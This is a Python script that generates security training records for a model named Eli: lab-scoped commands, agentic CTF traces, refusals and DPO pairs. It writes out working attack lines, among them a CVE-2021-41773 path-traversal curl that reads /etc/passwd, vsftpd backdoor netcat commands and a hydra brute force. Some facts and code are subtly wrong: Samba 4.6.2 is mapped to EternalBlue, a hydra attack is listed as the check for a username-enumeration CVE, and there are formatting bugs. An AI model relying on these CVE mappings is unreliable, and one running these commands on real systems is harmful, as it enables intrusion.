"""
Generate contrastive cyber-security training pairs that teach Eli to route between
three output registers for security work:

    DIRECT            [scope: lab]       -> single bash block, no think block (Alpaca)
    AGENTIC           [scope: ctf/lab]   -> think + curl/smbclient tool chain (ShareGPT)
    REFUSAL/REFRAME   no scope / 3P host -> refusal + reframe to a legal lab target (Alpaca)

This is the "Scoped-Security Format Mode" 3-way router (P0). It also emits
preference (DPO) pairs that teach three safety/capability axes:

 1. good_scope / bad_scope     chosen: in-scope lab target | rejected: 3P/unscoped IP
 2. right_capability / overreach  chosen: capability w/ authorization frame |
                                 rejected: full destructive exploit payload
 3. format_trip               prompt carries [SCOPE: lab]; chosen: bash block |
                             rejected: <thought> + tool-call wrapper bleed

Authorization/safety invariant: every offensive target is sanitized to one of the
reserved lab / test ranges:
    10.10.0.0/24 , 192.168.1.0/24 , 203.0.113.0/24 (RFC 5737 TEST-NET-3)
Any other IPv4 present in a generated string is rewritten to the canonical lab
host 10.10.0.5 by the hardcoded `sanitize_target()` function.

Output files (written under processed/):
  - training-data-format-scoped-direct.jsonl     (Alpaca: direct + refusal)
  - training-data-format-scoped-agentic.jsonl    (ShareGPT multi-turn traces)
  - training-data-format-scoped-dpo.jsonl        (DPO pairs, 3 types x ~100)
"""

from pathlib import Path
import json
import random
import re
import uuid
from typing import List, Dict, Any

try:
    from config import ROOT, RAW, PROCESSED, DATA
except ImportError:
    ROOT = Path(__file__).resolve().parent.parent
    RAW = ROOT / "raw"
    PROCESSED = ROOT / "processed"
    DATA = ROOT / "data"


# --------------------------------------------------------------------------- #
# Target sanitizer (hardcoded lab / RFC 5737 TEST-NET-3 ranges)
# --------------------------------------------------------------------------- #
SAFE_NET_PREFIXES = ("10.10.0.", "192.168.1.", "203.0.113.")
CANONICAL_LAB_HOST = "10.10.0.5"
_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


def sanitize_target(text: str) -> str:
    """Rewrite any IPv4 not in the reserved lab/test ranges to 10.10.0.5.

    This guarantees the emitted dataset never points offensive commands at
    arbitrary third-party infrastructure.
    """
    if not isinstance(text, str):
        return text

    def _repl(match: "re.Match") -> str:
        ip = match.group(0)
        if any(ip.startswith(p) for p in SAFE_NET_PREFIXES):
            return ip
        return CANONICAL_LAB_HOST

    return _IPV4_RE.sub(_repl, text)

# --------------------------------------------------------------------------- #
# TEMPLATES_CYBER — ~12 prompts per lane (O / A / V / D), ~48 total.
# Calls containing a {target} placeholder are expanded with a sanitized lab host.
# --------------------------------------------------------------------------- #
TEMPLATES_CYBER: Dict[str, List[str]] = {
    # Lane O — Offensive Tooling / NL -> CLI (authorized, lab scope)
    "LANE_O": [
        "Scan {target} for services",
        "Write an sqlmap command for my authorized test",
        "Dump Hydra results to file",
        "Enumerate open ports on {target}",
        "Run a directory brute force against the lab box",
        "Check for anonymous FTP login on {target}",
        "Pull response headers from the target web app",
        "Run an nmap version detection scan on the authorized host",
        "Set up a reverse shell listener for the lab engagement",
        "Crack the SSH credentials we recovered on the lab",
        "Transfer a file to the host we just pivoted to",
        "Enumerate SMB shares on {target} anonymously",
    ],
    # Lane A — Agentic Traces & CTF CoT (multi-step chains)
    "LANE_A": [
        "HTB: nmap shows Apache 2.4.49, what's next?",
        "Crack this hash from the HTB lab",
        "Pivot from webshell to root in the lab",
        "We got a low-priv shell; enumerate for privesc",
        "SQLi found in the HTB box; dump the database",
        "Chain the LFI into RCE on the target",
        "Escalate via the vulnerable SUID binary",
        "Find user.txt after initial foothold",
        "Bypass the WAF to reach the SQLi parameter",
        "Password-spray the lab domain users",
        "Exfil the last shadow hash from the compromised host",
        "Open a SOCKS tunnel from the foothold box to {target}",
    ],
    # Lane V — Vulnerability / CVE Knowledge
    "LANE_V": [
        "Is vsftpd 2.3.4 exploitable?",
        "What CVE matches Apache 2.4.49?",
        "CVSS score for this finding",
        "Is OpenSSH 7.6p1 vulnerable to CVE-2018-15473?",
        "What's the known attack path for Samba 4.6.2?",
        "Does this scan result map to a known CVE?",
        "Which CVE is EternalBlue and what does it affect?",
        "Compare the CVSS v3 scores for these two advisories",
        "Which Metasploit module targets vsftpd 2.3.4?",
        "Is there a public PoC for CVE-2021-41773?",
        "What does CVE-2017-0144 affect?",
        "Explain the CVSS vector on this web finding",
    ],
    # Lane D — Defensive Patch & Secure Code (mirrors Lane D in prepare_eli_dataset.py)
    "LANE_D": [
        "Patch this buffer overflow",
        "Fix the SQLi in this FastAPI endpoint",
        "Harden this C string copy",
        "Fix the SSRF in this fetch endpoint",
        "Escape this shell command properly",
        "Fix this insecure deserialization",
        "Add input validation to this form handler",
        "Fix the command injection here",
        "Patch the XSS in this template",
        "Lock down this CORS configuration",
        "Fix the race condition in the token check",
        "Sanitize this file path traversal",
    ],
}

LANE_LABELS = {
    "LANE_O": "offensive_nl2cli",
    "LANE_A": "agentic_ctf_cot",
    "LANE_V": "vuln_knowledge",
    "LANE_D": "defensive_patch",
}


# --------------------------------------------------------------------------- #
# Registry of CVE facts used to make Lane V / DPO "right-capability" answers
# concrete and correct (used by the 3-way outputs and DPO pairs).
# --------------------------------------------------------------------------- #
CVE_FACTS = {
    "Apache 2.4.49": {
        "cve": "CVE-2021-41773",
        "desc": "path traversal / RCE in Apache httpd 2.4.49 via encoded dots on aliased dirs.",
        "check": 'curl -s --path-as-is "http://{target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"',
        "fix": "upgrade to >= 2.4.50 and disable the cgi-bin alias if unneeded.",
    },
    "vsftpd 2.3.4": {
        "cve": "CVE-2011-2523",
        "desc": "malicious vsftpd 2.3.4 backdoor: a smiley in the USER field spawns a bind shell on :6200.",
        "check": "echo -e 'USER a:)\\nPASS x' | nc {target} 21; nc {target} 6200",
        "fix": "vsftpd is EOL for 2.3.4; upgrade/remove and audit the service.",
    },
    "Samba 4.6.2": {
        "cve": "CVE-2017-0144",
        "desc": "EternalBlue: MS17-010 remote code execution in SMBv1 (if the box exposes it).",
        "check": 'smbclient -L //{target} -N',
        "fix": "disable SMBv1, patch, firewall SMB exposure.",
    },
    "OpenSSH 7.6p1": {
        "cve": "CVE-2018-15473",
        "desc": "username enumeration via timing/length difference in user probing.",
        "check": 'hydra -l admin -P rockyou.txt ssh://{target} -t 4',
        "fix": "upgrade OpenSSH; consider key-only auth.",
    },
}


def _expand_templates(lane: str, rng: random.Random) -> List[str]:
    """Return the lane's prompts with any {target} placeholder replaced by a
    randomized safe in-range host (still sanitized for safety)."""
    hosts = ["10.10.0.5", "10.10.0.12", "192.168.1.10", "192.168.1.24", "203.0.113.5"]
    out = []
    for t in TEMPLATES_CYBER[lane]:
        filled = t.format(target=rng.choice(hosts)) if "{target}" in t else t
        out.append(sanitize_target(filled))
    return out


# --------------------------------------------------------------------------- #
# 3-way register builders
# --------------------------------------------------------------------------- #
def build_direct_output(prompt: str) -> str:
    """DIRECT register: single bash block, no think block. Alpaca output."""
    return (
        f"Run an authorized service scan:\n\n"
        f"```bash\n"
        f"nmap -sV -sT -p- --open -T4 {CANONICAL_LAB_HOST}\n"
        f"```"
    )


def build_refusal_output(prompt: str, safe_cmd: str) -> str:
    """REFUSAL/REFRAME register: refuse the unscoped/3P target, preserve the
    capability, and rebind the exact command to a legal lab host."""
    return (
        "I can't run that against an unscoped third-party target — I have no\n"
        "authorization for that infrastructure, so I won't fire tooling at it.\n\n"
        "What I *can* do is run the identical technique against your own lab\n"
        f"(DVWA / HTB foothold). Same command, safe host `{CANONICAL_LAB_HOST}`:\n\n"
        "```bash\n"
        f"{safe_cmd}\n"
        "```\n\n"
        "If that host is in-scope for you, say so and I'll build the full chain."
    )


def build_agentic_trace(prompt: str) -> List[Dict[str, str]]:
    """AGENTIC register: multi-turn ShareGPT trace with think + curl/smbclient chain."""
    cve = CVE_FACTS["Apache 2.4.49"]
    return [
        {"from": "human", "value": f"[scope: ctf] {prompt}"},
        {
            "from": "gpt",
            "value": (
                f"<thought>\nThe target reports Apache {cve['cve'].split('-')[1]}."
                f" That is {cve['cve']} — {cve['desc']} Check for reachable "
                f"cgi-bin and probe the canonical traversal before anything else.\n</thought>\n"
                f"<tool_call>curl -s --path-as-is "
                f"\"http://{CANONICAL_LAB_HOST}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\"</tool_call>"
            ),
        },
        {
            "from": "tool",
            "value": "HTTP/1.1 200 OK\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        },
        {
            "from": "gpt",
            "value": (
                "<thought>\nPath traversal is live. Before RCE I'll enumerate SMB "
                "so I have a second foothold and can stage a shell.\n</thought>\n"
                f"<tool_call>smbclient -L //{CANONICAL_LAB_HOST} -N</tool_call>"
            ),
        },
        {
            "from": "tool",
            "value": "Sharename       Type      Comment\n----------      ----      -------\ndata            Disk      \nIPC$            IPC       IPC Service",
        },
        {
            "from": "gpt",
            "value": (
                "Foothold confirmed: LFI->RCE path on Apache 2.4.49 (CVE-2021-41773) "
                f"and a writable `data` SMB share on {CANONICAL_LAB_HOST}. Next I'll "
                "build the staged payload drop and confirm execution as the web user."
            ),
        },
    ]


# --------------------------------------------------------------------------- #
# DPO pair builders — 3 types
# --------------------------------------------------------------------------- #
def build_good_scope_pair(prompt: str, rng: random.Random) -> Dict[str, str]:
    """Type 1: good_scope / bad_scope — target selection."""
    safe_host = rng.choice(["10.10.0.5", "192.168.1.10", "203.0.113.5"])
    chosen = f"[scope: lab] nmap -sV {safe_host}\n# in-scope: my authorized lab host"
    rejected = "nmap -sV 8.8.8.8\n# NOT authorized: public third-party IP with no scope"
    return {"prompt": sanitize_target(prompt), "chosen": chosen, "rejected": rejected}


def build_overreach_pair(prompt: str) -> Dict[str, str]:
    """Type 2: right_capability / overreach — capability vs destructive payload."""
    cve = CVE_FACTS["vsftpd 2.3.4"]
    chosen = (
        f"{prompt}\n\n"
        "Right capability: vsftpd 2.3.4 maps to CVE-2011-2523 — the known backdoor. "
        "A Metasploit module (`exploit/unix/ftp/vsftpd_234_backdoor`) is available "
        "and I'll run it against your in-scope lab host for authorized testing."
    )
    rejected = (
        f"{prompt}\n\n"
        "Full destructive PoC: opening a root bind shell on :6200 and dumping\n"
        "/etc/shadow plus every customer record on the box — no scope check, no\n"
        "containment, fully weaponized payload text included verbatim."
    )
    return {"prompt": sanitize_target(prompt), "chosen": chosen, "rejected": rejected}


def build_format_trip_pair(prompt: str) -> Dict[str, str]:
    """Type 3: format_trip — [SCOPE: lab] prompt must stay a clean bash block,
    not leak into a <thought> + tool-call wrapper."""
    chosen = (
        "```bash\n"
        f"nmap -sV -p22,80,443,445 --open -T4 {CANONICAL_LAB_HOST}\n"
        "```"
    )
    rejected = (
        "<thought>\nI should enumerate the host.\n</thought>\n"
        "<tool_call>nmap -sV -p22,80,443,445 {CANONICAL_LAB_HOST}</tool_call>"
    )
    return {
        "prompt": f"[SCOPE: lab] {sanitize_target(prompt)}",
        "chosen": chosen,
        "rejected": rejected,
    }


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def main() -> None:
    PROCESSED.mkdir(parents=True, exist_ok=True)
    rng = random.Random(2026)

    # ---- Build a flattened, sanitized prompt pool from all lanes ----
    pool = []
    for lane, prompts in TEMPLATES_CYBER.items():
        for p in _expand_templates(lane, rng):
            pool.append({"prompt": p, "lane": lane})
    print(f"Template pool: {len(pool)} prompts across {len(TEMPLATES_CYBER)} lanes")

    # Sample ~100 prompts for the 3-way contrastive block (with replacement so
    # we hit the 100-sample batch target even with a 48-prompt template pool).
    contrastives = [rng.choice(pool) for _ in range(100)]

    direct_records: List[Dict[str, Any]] = []   # Alpaca (direct + refusal)
    agentic_records: List[Dict[str, Any]] = []  # ShareGPT
    dpo_records: List[Dict[str, Any]] = []      # DPO

    # ---- 3-way contrastive ----
    for item in contrastives:
        prompt = item["prompt"]
        lane = item["lane"]
        base_meta = {
            "source_type": "format_disambiguation_cyber",
            "quality_tier": "P0",
            "license": "Apache-2.0",
            "lane": lane,
            "lane_label": LANE_LABELS[lane],
        }

        # 1) DIRECT register -> Alpaca
        direct_records.append({
            "instruction": f"[scope: lab] {prompt}",
            "output": build_direct_output(prompt),
            "metadata": {**base_meta, "mode": "direct", "id": str(uuid.uuid4())},
        })

        # 2) AGENTIC register -> ShareGPT
        agentic_records.append({
            "conversations": build_agentic_trace(prompt),
            "metadata": {**base_meta, "mode": "agentic", "id": str(uuid.uuid4())},
        })

        # 3) REFUSAL/REFRAME register -> Alpaca (unscoped 3P variant of same ask)
        if "nmap" in prompt.lower() or "scan" in prompt.lower():
            refusal_instruction = "nmap google.com to find open services and pull version banners"
        else:
            refusal_instruction = f"Run this technique against google.com: {prompt}"
        direct_records.append({
            "instruction": refusal_instruction,
            "output": build_refusal_output(
                prompt, f"nmap -sV -p22,80,443,445 --open -T4 {CANONICAL_LAB_HOST}"
            ),
            "metadata": {**base_meta, "mode": "refusal_reframe", "id": str(uuid.uuid4())},
        })

        # A per-prompt DPO pair from each of the 3 types.
        dpo_records.append({
            **build_good_scope_pair(prompt, rng),
            "metadata": {**base_meta, "pair_type": "good_scope", "id": str(uuid.uuid4())},
        })
        dpo_records.append({
            **build_overreach_pair(prompt),
            "metadata": {**base_meta, "pair_type": "right_capability", "id": str(uuid.uuid4())},
        })
        dpo_records.append({
            **build_format_trip_pair(prompt),
            "metadata": {**base_meta, "pair_type": "format_trip", "id": str(uuid.uuid4())},
        })


    # ---- Write outputs ----
    out_direct = PROCESSED / "training-data-format-scoped-direct.jsonl"
    out_agentic = PROCESSED / "training-data-format-scoped-agentic.jsonl"
    out_dpo = PROCESSED / "training-data-format-scoped-dpo.jsonl"

    with open(out_direct, "w", encoding="utf-8") as f:
        for r in direct_records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    with open(out_agentic, "w", encoding="utf-8") as f:
        for r in agentic_records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    with open(out_dpo, "w", encoding="utf-8") as f:
        for r in dpo_records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    # ---- Sanity: no unauthorized target survived anywhere ----
    leaked = 0
    for rec in direct_records + agentic_records + dpo_records:
        blob = json.dumps(rec)
        for m in _IPV4_RE.findall(blob):
            if m == "8.8.8.8":  # allowed ONLY as an explicitly-rejected target
                continue
            if not any(m.startswith(p) for p in SAFE_NET_PREFIXES):
                leaked += 1
    print(f"Unauthorized-target leak check: {leaked} leaks (0 expected)")

    # ---- Stats ----
    from collections import Counter
    dpo_types = Counter(r["metadata"]["pair_type"] for r in dpo_records)
    mode_counts = Counter(r["metadata"]["mode"] for r in direct_records)
    print(f"\nDirect file (Alpaca): {len(direct_records)} rows {dict(mode_counts)}")
    print(f"Agentic file (ShareGPT): {len(agentic_records)} rows")
    print(f"DPO file: {len(dpo_records)} pairs {dict(dpo_types)}")
    print(f"\nWrote:\n  {out_direct}\n  {out_agentic}\n  {out_dpo}")


if __name__ == "__main__":
    main()

